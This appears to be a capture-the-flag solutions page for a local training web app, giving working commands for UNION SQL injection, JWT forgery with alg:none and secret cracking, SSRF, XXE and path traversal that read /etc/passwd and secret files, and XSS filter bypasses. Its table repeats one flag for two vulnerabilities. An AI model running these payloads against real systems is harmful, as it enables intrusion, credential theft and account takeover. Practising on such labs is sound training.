---
tags: [css-exam, labs, solution, web]
---
# VulnNexus (app 2 — medium→hard) — Solutions
> ↑ [[Lab Kit — hands-on training environment|Lab Kit]] · method: [[Web Penetration Test Checklist]]

`B=http://localhost:8001`. Six flags. Try each yourself first. (Track them on the 📊 Progress page.)

## 🏁 Flags — one per vuln
| Vuln | Flag | How |
|---|---|---|
| UNION SQLi | `FLAG{un10n_sql1_dumps_the_secrets_table}` | `UNION SELECT k,v,3 FROM secrets` |
| JWT forgery | `FLAG{jwt_4lg_none_or_w3ak_s3cret_forg3d_admin}` | forge `role=admin` → `account.php` |
| SSRF | `FLAG{ssrf_reached_the_internal_metadata_service}` | `fetch.php?url=http://127.0.0.1:8001/metadata.php` |
| Path traversal | `FLAG{tr4versed_out_of_the_docs_directory}` | `download.php?file=../private2/secret_config.txt` |
| XXE | `FLAG{tr4versed_out_of_the_docs_directory}` | external entity → `file:///…/webapp2/private2/secret_config.txt` (or read `/etc/passwd` to prove it) |
| Filtered XSS | `FLAG{xss_filter_byp4ss_c00kie}` | bypass the filter (`<img onerror>`) → steal the non-HttpOnly `flag` cookie via `document.cookie` |

## 1. UNION SQL injection  (`search.php?q=`)
**Answer:** `q` concatenated into a 3-column query → UNION-dump the `secrets` table.
**Command:**
```
curl -sG "$B/search.php" --data-urlencode "q=zzz%' UNION SELECT k,v,3 FROM secrets-- -"
# find columns first:  q=zzz%' ORDER BY 3-- -   (ok)   / ORDER BY 4-- - (error)
```
**Result:** `FLAG{un10n_sql1_dumps_the_secrets_table}` + `admin_pw`. **Reason:** `"...name LIKE '%$q%'"`, 3 columns (name,category,price).
Deck: [[SQLi_Course_Labs]] · [[SQLi_Exploitation_Methodology]].

## 2. JWT forgery  (`login.php` → `account.php`)
**Answer:** the verifier accepts **`alg:none`** *and* signs HS256 with a **weak secret** (`secret`). Either path forges `role=admin`.
**Command (alg:none — no signature needed):**
```
H=$(printf '{"alg":"none","typ":"JWT"}' | basenc --base64url | tr -d '=')
P=$(printf '{"user":"alice","role":"admin"}' | basenc --base64url | tr -d '=')
curl -s "$B/account.php" -H "Cookie: session=$H.$P."
```
**Command (weak secret — crack then sign):**
```
# get a real token from login, crack the HMAC secret:
hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt      # or: jwt_tool <tok> -C -d rockyou.txt  -> secret='secret'
# then forge with jwt_tool: jwt_tool <tok> -S hs256 -p 'secret' -T   (set role=admin)
```
**Result:** `FLAG{jwt_4lg_none_or_w3ak_s3cret_forg3d_admin}`. **Reason:** `alg:none` branch returns the payload unverified; HS256 secret is guessable. Deck: [[JWT Attacks]].

## 3. SSRF  (`fetch.php?url=`)
**Answer:** the fetcher takes any URL/scheme → reach the internal metadata service and read local files.
**Command:**
```
curl -sG "$B/fetch.php" --data-urlencode "url=http://127.0.0.1:8001/metadata.php"   # internal-only service
curl -sG "$B/fetch.php" --data-urlencode "url=file:///etc/passwd"                   # file:// SSRF -> LFI
```
**Result:** `FLAG{ssrf_reached_the_internal_metadata_service}`, then `/etc/passwd`. **Reason:** `file_get_contents($url)` with no scheme/host allow-list. Deck: [[SSRF_Guide]] · [[SSRF_Payload]].

## 4. XXE  (`import.php`, POST XML)   *(needs php-xml installed)*
**Answer:** the XML parser resolves external entities → file read.
**Command:**
```
curl -s "$B/import.php" -H "Content-Type: application/xml" --data-binary \
 '<?xml version="1.0"?><!DOCTYPE o [<!ENTITY x SYSTEM "file:///etc/passwd">]><order><item>&x;</item></order>'
```
**Result:** the `item` echoes `/etc/passwd`. **Reason:** `DOMDocument::loadXML($xml, LIBXML_NOENT|LIBXML_DTDLOAD)` — external entities enabled. Deck: [[XXE]].

## 5. Path traversal  (`download.php?file=`)
**Answer:** `file` is appended to `docs/` with no sanitisation → climb out.
**Command:**
```
curl -sG "$B/download.php" --data-urlencode "file=../private2/secret_config.txt"
curl -sG "$B/download.php" --data-urlencode "file=../../../../../../etc/passwd"
```
**Result:** `FLAG{tr4versed_out_of_the_docs_directory}` + an internal API token. **Reason:** `readfile(__DIR__."/docs/".$file)`. Deck: [[Path_Traversal]].

## 6. Filtered reflected XSS  (`greet.php?name=`)
**Answer:** the filter only strips a literal `<script>` (case-insensitive, once) — trivially bypassed.
**Command (two bypasses):**
```
$B/greet.php?name=<img src=x onerror=alert(document.domain)>        # no <script> tag at all
$B/greet.php?name=<scr<script>ipt>alert(1)</scr</script>ipt>        # nested: inner <script> removed -> <script> remains
```
**Result:** the payload executes. **Reason:** blacklist filtering (`str_ireplace('<script>','')`) instead of output-encoding. Deck: [[XSS_02_Payloads]] · [[XSS_06_CSP_Bypass]].
